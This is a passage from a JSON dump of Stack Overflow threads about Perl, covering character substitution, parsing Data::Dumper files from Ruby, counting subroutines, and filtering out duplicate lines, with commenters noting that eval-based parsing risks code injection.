"user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1496759343, "post_id": 44390102, "comment_id": 75785215, "body": "@DaveCross yes, but this is the approach to take if some of the search or replace strings were multiple characters; well worth having as an alternate answer"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 0, "creation_date": 1496759527, "post_id": 44390102, "comment_id": 75785357, "body": "@ysth: Agreed. Which is why (as I said) I haven&#39;t downvoted."}], "tags": [], "owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "is_accepted": false, "score": -1, "last_activity_date": 1496752778, "last_edit_date": 1496752778, "creation_date": 1496752348, "answer_id": 44390102, "question_id": 44389905, "link": "https://stackoverflow.com/questions/44389905/replace-multiple-characters-with-multiple-replacers-in-perl/44390102#44390102", "title": "Replace multiple characters with multiple replacers in Perl", "body": "<p>A simple another way to replace the strings:</p>\n\n<pre><code>$str = \"\\;  \\:\\;    \";\n</code></pre>\n\n<p>Need to find the two matches <code>\\;</code> and <code>\\t</code> we can search the both of them in a single regex and replace to the corresponding value matches.</p>\n\n<pre><code>$str=~s/((\\;)|\\t)/$2 ? '\\:' : '\\;'/eg;\n           ^   ^\n</code></pre>\n\n<p><code>$2</code> matches with <code>semicolon</code> and rest of the one matches with <code>\\t</code> delimits.</p>\n\n<pre><code>print $str;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 4, "last_activity_date": 1496755870, "last_edit_date": 1496755870, "creation_date": 1496752944, "answer_id": 44390329, "question_id": 44389905, "link": "https://stackoverflow.com/questions/44389905/replace-multiple-characters-with-multiple-replacers-in-perl/44390329#44390329", "title": "Replace multiple characters with multiple replacers in Perl", "body": "<p>Perl has the \"transliteration\" operator (<code>tr/.../.../</code>) for doing work like this.</p>\n\n<pre><code>$string =~ tr/\\t;/;:/;\n</code></pre>\n\n<p>Using the substitution operator for this is overkill.</p>\n"}], "owner": {"reputation": 109, "user_id": 7095322, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/2a2993c68412ce1526b19d682ee5a8d2?s=128&d=identicon&r=PG&f=1", "display_name": "AVS", "link": "https://stackoverflow.com/users/7095322/avs"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 268, "favorite_count": 0, "answer_count": 2, "score": -3, "last_activity_date": 1496755870, "creation_date": 1496751728, "last_edit_date": 1496753076, "question_id": 44389905, "link": "https://stackoverflow.com/questions/44389905/replace-multiple-characters-with-multiple-replacers-in-perl", "title": "Replace multiple characters with multiple replacers in Perl", "body": "<p>I am updating a piece of code to read a table into R. The delimiters in the table should be semicolons. Some of the elements in the table have semicolons and should be replaced with colons. At the same time, the code is replacing tabs with semicolons and this should be kept.</p>\n\n<p>The current script has the line</p>\n\n<pre><code>sprintf(\"%s -e '%s' | perl -pe 's/\\t/;/g' &gt; %s\", hive.cmd, sql, tmp_file)\n</code></pre>\n\n<p>and should be updated to, in order:</p>\n\n<ol>\n<li>Replace <code>;</code> with <code>:</code></li>\n<li>Replace <code>\\t</code> with <code>;</code></li>\n</ol>\n\n<p>Edit: I should add I have no experience in Perl.</p>\n"}, {"tags": ["ruby", "perl"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1496744680, "post_id": 44387235, "comment_id": 75774589, "body": "Are there references? Were <code>$Data::Dumper::Purity</code> or <code>$Data::Dumper::Deparse</code> used?"}], "answers": [{"comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496746857, "post_id": 44387353, "comment_id": 75775954, "body": "Is Ruby going to understand Perl data structures?"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1496747074, "post_id": 44387353, "comment_id": 75776100, "body": "@simbabque this syntax for hashes is shared between perl and ruby."}, {"owner": {"reputation": 826, "user_id": 2819525, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/830e2fecdd962110e83555e0d2ee8ee5?s=128&d=identicon&r=PG&f=1", "display_name": "Benedikt Bock", "link": "https://stackoverflow.com/users/2819525/benedikt-bock"}, "edited": false, "score": 0, "creation_date": 1496747303, "post_id": 44387353, "comment_id": 75776260, "body": "It works in this case. From my point of view this only works with hashes?"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 4, "creation_date": 1496747387, "post_id": 44387353, "comment_id": 75776321, "body": "It should work with arrays as well. Ruby syntax for internal structures is highly inspired by perl."}], "tags": [], "owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "is_accepted": true, "score": 4, "last_activity_date": 1496744311, "creation_date": 1496744311, "answer_id": 44387353, "question_id": 44387235, "link": "https://stackoverflow.com/questions/44387235/parse-perl-datadumper-output-with-ruby/44387353#44387353", "title": "Parse Perl Data::Dumper output with ruby", "body": "<p>If this data is yours and you are positive it contains no unexpected/harmful strings in it, the simplest way would be (assuming the content of the file is what you have posted):</p>\n\n<pre><code>eval(File.read(file))\nmy_local_var = $VAR1\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 1, "creation_date": 1496750407, "post_id": 44388288, "comment_id": 75778405, "body": "I&#39;ve added the corresponding code snippets, hope you don&#39;t mind."}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 1, "creation_date": 1496750576, "post_id": 44388288, "comment_id": 75778509, "body": "You can also invoke the shell command from within Ruby via <a href=\"http://ruby-doc.org/core-2.4.1/Kernel.html#method-i-60\" rel=\"nofollow noreferrer\">backticks</a> and pass the output to the JSON parser: <code>JSON.parse(`cat data.pl | json_pp -f eval -t json`)</code>"}, {"owner": {"reputation": 826, "user_id": 2819525, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/830e2fecdd962110e83555e0d2ee8ee5?s=128&d=identicon&r=PG&f=1", "display_name": "Benedikt Bock", "link": "https://stackoverflow.com/users/2819525/benedikt-bock"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1496757883, "post_id": 44388288, "comment_id": 75784071, "body": "@Stefan Does the <code>eval</code> in <code>json_pp -f eval -t json</code> contain the same vulnerability against code injection as the answer of mudasobwa ?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 826, "user_id": 2819525, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/830e2fecdd962110e83555e0d2ee8ee5?s=128&d=identicon&r=PG&f=1", "display_name": "Benedikt Bock", "link": "https://stackoverflow.com/users/2819525/benedikt-bock"}, "edited": false, "score": 1, "creation_date": 1496758039, "post_id": 44388288, "comment_id": 75784193, "body": "@BenediktBock it does. If you read <a href=\"https://metacpan.org/source/ISHIGAKI/JSON-PP-2.94/bin/json_pp#L43\" rel=\"nofollow noreferrer\">the code</a> you&#39;ll see that. Alternatively you could hack something together in Perl that will not allow arbitrary code execution, using maybe <a href=\"https://metacpan.org/pod/Safe\" rel=\"nofollow noreferrer\">metacpan.org/pod/Safe</a>."}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": false, "score": 1, "last_activity_date": 1496750249, "last_edit_date": 1496750249, "creation_date": 1496747050, "answer_id": 44388288, "question_id": 44387235, "link": "https://stackoverflow.com/questions/44387235/parse-perl-datadumper-output-with-ruby/44388288#44388288", "title": "Parse Perl Data::Dumper output with ruby", "body": "<p>Since you already have the files and can't change them, one way would be to use a utility that converts them to a format your Ruby understands, like JSON. If you have the JSON module in your Perl distribution (you probably have a system Perl), you also have the <a href=\"https://metacpan.org/pod/distribution/JSON-PP/bin/json_pp\" rel=\"nofollow noreferrer\"><code>json_pp</code> utility</a>.</p>\n\n<p>So you could shell out to that, and let it convert your Perl data structure (Data::Dumper is nothing else than that) to JSON:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>$ cat data.pl | json_pp -f eval -t json &gt; data.json\n</code></pre>\n\n<p>and then use Ruby to convert that JSON to a Ruby data structure:</p>\n\n<pre><code>require 'json'\nJSON.parse(File.read('data.json'))\n#=&gt; {\n#     \"localtime\" =&gt; \"Tue Jun  6 11:48:20 2017\",\n#     \"ifHCOutOctets\" =&gt; \"74372744112\",\n#     \"ifHCInOctets\" =&gt; \"13199010183\",\n#     # ...\n#   }\n</code></pre>\n"}], "owner": {"reputation": 826, "user_id": 2819525, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/830e2fecdd962110e83555e0d2ee8ee5?s=128&d=identicon&r=PG&f=1", "display_name": "Benedikt Bock", "link": "https://stackoverflow.com/users/2819525/benedikt-bock"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 98, "favorite_count": 0, "accepted_answer_id": 44387353, "answer_count": 2, "score": 0, "last_activity_date": 1496750249, "creation_date": 1496743996, "question_id": 44387235, "link": "https://stackoverflow.com/questions/44387235/parse-perl-datadumper-output-with-ruby", "title": "Parse Perl Data::Dumper output with ruby", "body": "<p>I've a directory full of state files which were printed by Perl's Data::Dumper. The content looks like this:</p>\n\n<pre><code>$VAR1 = {\n          'localtime' =&gt; 'Tue Jun  6 11:48:20 2017',\n          'lookback_history' =&gt; {\n                                  'ifHCOutOctets' =&gt; {\n                                                       '1496742350.42394' =&gt; '74365529910',\n                                                       '1496742455.72943' =&gt; '74366309899',\n                                                       '1496742446.38562' =&gt; '74366309114',\n                                                       '1496742500.42388' =&gt; '74372744112'\n                                                     },\n                                  'ifHCInOctets' =&gt; {\n                                                      '1496742350.42394' =&gt; '13198364950',\n                                                      '1496742455.72943' =&gt; '13198718163',\n                                                      '1496742446.38562' =&gt; '13198705712',\n                                                      '1496742500.42388' =&gt; '13199010183'\n                                                    }\n                                },\n          'timestamp' =&gt; '1496742500.42388',\n          'ifHCOutOctets' =&gt; '74372744112',\n          'ifHCInOctets' =&gt; '13199010183'\n        };\n</code></pre>\n\n<p>I've to analyze if the files contain unreproducible information. </p>\n\n<p>Is there a way in ruby to parse those perl dumps?</p>\n"}, {"tags": ["regex", "linux", "perl"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1496743967, "post_id": 44387132, "comment_id": 75774137, "body": "Are you asking what to insert instead of <code>statements</code>?"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 1, "creation_date": 1496744026, "post_id": 44387132, "comment_id": 75774164, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/2559792/how-can-i-get-the-name-of-the-current-subroutine-in-perl\">How can I get the name of the current subroutine in Perl?</a>"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 6, "creation_date": 1496781325, "post_id": 44387132, "comment_id": 75798589, "body": "How is the question unclear? Voting to reopen."}], "answers": [{"comments": [{"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 1, "creation_date": 1496754989, "post_id": 44387319, "comment_id": 75781921, "body": "<code>caller</code> just examines the current subroutine (or the call path/tree that led to the current subroutine. I think the OP wants information about all subroutines in a file, even if they are unrelated."}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 2, "last_activity_date": 1496744207, "creation_date": 1496744207, "answer_id": 44387319, "question_id": 44387132, "link": "https://stackoverflow.com/questions/44387132/how-to-display-the-number-of-subroutines-and-their-names-in-a-perl-script-at-the/44387319#44387319", "title": "How to display the number of subroutines and their names in a perl script at the time of its execution?", "body": "<p>I think the function you're looking for is <a href=\"https://perldoc.perl.org/functions/caller.html\" rel=\"nofollow noreferrer\"><code>caller</code></a>:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\n\nsub test {\n\n   my (\n      $package, $filename,  $line,     $subroutine,\n      $hasargs, $wantarray, $evaltext, $is_require,\n      $hints,   $bitmask,   $hinthash\n     )\n     = caller(0);\n   print \"$subroutine called at $line of $filename\\n\";\n}\n\ntest;\n</code></pre>\n\n<p>Note - without arguments, <code>caller</code> returns just package, filename and line. The number is a number of stack frames, in case you're nesting the subroutine. </p>\n"}, {"tags": [], "owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "is_accepted": true, "score": 8, "last_activity_date": 1496755226, "last_edit_date": 1496755226, "creation_date": 1496751424, "answer_id": 44389788, "question_id": 44387132, "link": "https://stackoverflow.com/questions/44387132/how-to-display-the-number-of-subroutines-and-their-names-in-a-perl-script-at-the/44389788#44389788", "title": "How to display the number of subroutines and their names in a perl script at the time of its execution?", "body": "<p>You are looking for <a href=\"https://metacpan.org/pod/Devel::Symdump\" rel=\"noreferrer\">Devel::Symdump</a>:</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\n\n{\n    require Devel::Symdump;\n    my $sym = Devel::Symdump-&gt;new('main');\n    my @subs = $sym-&gt;functions;\n    printf \"Number of subroutines: %d\\n\", scalar @subs;\n    printf \"Names of subroutines: %s\\n\", join(q{, } =&gt; map { s/^main:://; $_ } @subs);\n}\n\nsub f1 {\n    # statements\n}\n\nsub f2 {\n    # statements\n}\n\nsub f3 {\n    # statements\n}\n\nf1();\nf2();\nf3();\n</code></pre>\n\n<p>Output:</p>\n\n<pre>Number of subroutines: 3\nNames of subroutines: f2, f1, f3</pre>\n"}, {"comments": [{"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 1, "creation_date": 1496760241, "post_id": 44390934, "comment_id": 75785904, "body": "It uses PPI to parse a file instead of examining the symbol table. That may be what one wants, but the distinction is not immaterial which is why we need clarification from the OP. Also, you do not need semicolons after subroutine bodies."}], "tags": [], "owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "is_accepted": false, "score": 6, "last_activity_date": 1496761230, "last_edit_date": 1496761230, "creation_date": 1496754645, "answer_id": 44390934, "question_id": 44387132, "link": "https://stackoverflow.com/questions/44387132/how-to-display-the-number-of-subroutines-and-their-names-in-a-perl-script-at-the/44390934#44390934", "title": "How to display the number of subroutines and their names in a perl script at the time of its execution?", "body": "<p><a href=\"https://metacpan.org/pod/Devel::Examine::Subs\" rel=\"nofollow noreferrer\">Devel::Examine::Subs</a> can do these types of things.</p>\n\n<pre><code>use strict;\nuse warnings;\nuse feature 'say';\n\nuse Devel::Examine::Subs;\n\nmy $des = Devel::Examine::Subs-&gt;new(file =&gt; $0);\n\nmy $subs = $des-&gt;objects;\n\nsay \"number of subs:\" . @$subs . \"\\n\";\n\nfor my $sub (@$subs){\n    say \"name:  \" . $sub-&gt;name;       # name of sub\n    say \"start: \" . $sub-&gt;start;      # first line number of sub in file\n    say \"end: \"   . $sub-&gt;end;        # last line number of sub in file\n    say \"lines: \" . $sub-&gt;line_count; # number of lines in sub\n    # $sub-&gt;code;                     # entire sub code from file\n    # $sub-&gt;lines;                    # lines that match search term\n    say \"\\n\";\n}\n\nsub func1 {}\nsub func2 {}\nsub func3 {}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>number of subs:3\n\nname:  func3\nstart: 25\nend: 25\nlines: 1\n\n\nname:  func2\nstart: 24\nend: 24\nlines: 1\n\n\nname:  func1\nstart: 23\nend: 23\nlines: 1\n</code></pre>\n"}], "owner": {"reputation": 165, "user_id": 4915658, "user_type": "registered", "accept_rate": 80, "profile_image": "https://graph.facebook.com/880691111995798/picture?type=large", "display_name": "Vamsee Bond", "link": "https://stackoverflow.com/users/4915658/vamsee-bond"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 161, "favorite_count": 0, "accepted_answer_id": 44389788, "answer_count": 3, "score": 3, "last_activity_date": 1571973329, "creation_date": 1496743673, "last_edit_date": 1571955161, "question_id": 44387132, "link": "https://stackoverflow.com/questions/44387132/how-to-display-the-number-of-subroutines-and-their-names-in-a-perl-script-at-the", "title": "How to display the number of subroutines and their names in a perl script at the time of its execution?", "body": "<p>Consider the following Perl script <strong>script.pl</strong> as an example:</p>\n\n<pre><code>use strict;\nuse warnings;\nsub f1\n{statements}\nsub f2\n{statements}\nsub f3\n{statements}\nf1();f2();f3();\n</code></pre>\n\n<p>When I execute the script, it should show the following output:</p>\n\n<p><strong>./script.pl</strong></p>\n\n<blockquote>\n  <p>number of subroutines:3<br>\n  names of subroutines:f1 f2 f3</p>\n</blockquote>\n\n<p>When the code is executed, how can I count the number of subroutines, get their names, and then print them during runtime?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 399, "user_id": 2337587, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/a50dbded857122824f1c44610c0667b5?s=128&d=identicon&r=PG", "display_name": "NepCoder", "link": "https://stackoverflow.com/users/2337587/nepcoder"}, "edited": false, "score": 0, "creation_date": 1496695682, "post_id": 44377390, "comment_id": 75755822, "body": "Do you need to make it work with perl? If you are on unix try sort -u file &gt; new_file instead."}, {"owner": {"reputation": 469, "user_id": 3000685, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d94fa8d3249e2f10ccb693993c0db6ba?s=128&d=identicon&r=PG&f=1", "display_name": "secJ", "link": "https://stackoverflow.com/users/3000685/secj"}, "reply_to_user": {"reputation": 399, "user_id": 2337587, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/a50dbded857122824f1c44610c0667b5?s=128&d=identicon&r=PG", "display_name": "NepCoder", "link": "https://stackoverflow.com/users/2337587/nepcoder"}, "edited": false, "score": 0, "creation_date": 1496695984, "post_id": 44377390, "comment_id": 75755964, "body": "@NepCoder <code>sort -u</code> gives me the same output as my last above (i.e., lines 1-5).  I need to exclude lines that every appear more than once all together."}, {"owner": {"reputation": 19969, "user_id": 23512, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/tUj1I.png?s=128&g=1", "display_name": "Tanktalus", "link": "https://stackoverflow.com/users/23512/tanktalus"}, "edited": false, "score": 0, "creation_date": 1496696052, "post_id": 44377390, "comment_id": 75755996, "body": "Do the lines have to stay in the same order?"}, {"owner": {"reputation": 469, "user_id": 3000685, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d94fa8d3249e2f10ccb693993c0db6ba?s=128&d=identicon&r=PG&f=1", "display_name": "secJ", "link": "https://stackoverflow.com/users/3000685/secj"}, "reply_to_user": {"reputation": 19969, "user_id": 23512, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/tUj1I.png?s=128&g=1", "display_name": "Tanktalus", "link": "https://stackoverflow.com/users/23512/tanktalus"}, "edited": false, "score": 0, "creation_date": 1496696238, "post_id": 44377390, "comment_id": 75756062, "body": "@Tanktalus Sorry, yes if possible.  Playing off of @NepCoder &#39;s comment, I could get what I have as the desired output by <code>sort file | uniq -u</code> but I&#39;m not keeping the original order of the file"}, {"owner": {"reputation": 469, "user_id": 3000685, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d94fa8d3249e2f10ccb693993c0db6ba?s=128&d=identicon&r=PG&f=1", "display_name": "secJ", "link": "https://stackoverflow.com/users/3000685/secj"}, "edited": false, "score": 0, "creation_date": 1496698360, "post_id": 44377390, "comment_id": 75756897, "body": "Why the down vote?"}], "answers": [{"comments": [{"owner": {"reputation": 469, "user_id": 3000685, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d94fa8d3249e2f10ccb693993c0db6ba?s=128&d=identicon&r=PG&f=1", "display_name": "secJ", "link": "https://stackoverflow.com/users/3000685/secj"}, "edited": false, "score": 0, "creation_date": 1496696709, "post_id": 44377548, "comment_id": 75756261, "body": "@ikegami thanks for the detailed answers!  These are right down the path I was thinking.  Looks like the first two perl one-liners are duplicates?  When I run them or the sort command, I get all uniq lines (so 1-5) vs. the desired 3,4,and 5.  I&#39;m not getting an output from the last example, but looking at it more closely now."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 2, "last_activity_date": 1496699616, "last_edit_date": 1496699616, "creation_date": 1496696127, "answer_id": 44377548, "question_id": 44377390, "link": "https://stackoverflow.com/questions/44377390/perl-dont-print-any-lines-that-are-duplicates/44377548#44377548", "title": "Perl: Don&#39;t print any lines that are duplicates", "body": "<p>You only know if a line is unique after you've read all the lines, so you can't possibly start printing before you've reached the end of the file!</p>\n\n<pre><code># Varying order\n\nperl -nle'++$lines{$_}; END { print for grep $lines{$_}==1, keys %lines; }' file\n</code></pre>\n\n<p>or</p>\n\n<pre><code># Sorted\n\nperl -nle'++$lines{$_}; END { print for sort grep $lines{$_}==1, keys %lines; }' file\n</code></pre>\n\n<p>or</p>\n\n<pre><code># Original order\n\nperl -nle'\n   if ( my $orig_line_num = $line_nums_by_line{$_} ) {\n      $lines_by_line_num[$orig_line_num] = undef;\n   } else {\n      $lines_by_line_num[$.] = $_;\n      $line_nums_by_line{$_} = $.;\n   }\n\n   END { print for grep defined, @lines_by_line_num; }\n' file\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1496700189, "post_id": 44377859, "comment_id": 75757642, "body": "If you want to handle a lack of newline on the last line: <code>perl -le&#39;chomp( @a=&lt;&gt; ); $d{$_}++ for @a; print for grep {$d{$_}&lt;2} @a&#39; file</code>"}, {"owner": {"reputation": 469, "user_id": 3000685, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d94fa8d3249e2f10ccb693993c0db6ba?s=128&d=identicon&r=PG&f=1", "display_name": "secJ", "link": "https://stackoverflow.com/users/3000685/secj"}, "edited": false, "score": 0, "creation_date": 1496706649, "post_id": 44377859, "comment_id": 75759500, "body": "@KoshVery pretty clever answer!  The use of grep to pull out only values equaling <code>1</code> is pretty sharp!  Well done.  another great answer!"}], "tags": [], "owner": {"reputation": 14587, "user_id": 5724303, "user_type": "registered", "profile_image": "https://graph.facebook.com/1100229700001875/picture?type=large", "display_name": "Kosh", "link": "https://stackoverflow.com/users/5724303/kosh"}, "is_accepted": false, "score": 4, "last_activity_date": 1496699987, "last_edit_date": 1496699987, "creation_date": 1496697504, "answer_id": 44377859, "question_id": 44377390, "link": "https://stackoverflow.com/questions/44377390/perl-dont-print-any-lines-that-are-duplicates/44377859#44377859", "title": "Perl: Don&#39;t print any lines that are duplicates", "body": "<p>Another way to do it:</p>\n\n<pre><code>perl -e'@a=&lt;&gt;; $d{$_}++ for @a; print grep {$d{$_}&lt;2} @a' file\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 469, "user_id": 3000685, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d94fa8d3249e2f10ccb693993c0db6ba?s=128&d=identicon&r=PG&f=1", "display_name": "secJ", "link": "https://stackoverflow.com/users/3000685/secj"}, "edited": false, "score": 0, "creation_date": 1496706507, "post_id": 44378692, "comment_id": 75759470, "body": "thanks for the response.  I agree, I like the first one-liner a lot.  Copy the file into an array, keep track of the number of occurrences into the <code>c</code> hash, incrementing the key when seeing a duplicate. Then use the second array (cp <code>@a</code> back to <code>@ARGV</code> (thus less memory)? and pull the key value pairs from the hash who&#39;s value is only equal to <code>1</code>.  (at least I think I&#39;m interpreting that correctly.) The second option reiterates through the same array twice over thus using twice the memory.  Very good!  I wish i could select multiple correct answers!"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 2, "last_activity_date": 1496701876, "creation_date": 1496701876, "answer_id": 44378692, "question_id": 44377390, "link": "https://stackoverflow.com/questions/44377390/perl-dont-print-any-lines-that-are-duplicates/44378692#44378692", "title": "Perl: Don&#39;t print any lines that are duplicates", "body": "<p>As mentioned above, to filter the file in this way and keep the lines in order you need to either read through the file twice or to store line number information while you read</p>\n\n<p>This one-liner seems the best option</p>\n\n<pre><code>perl 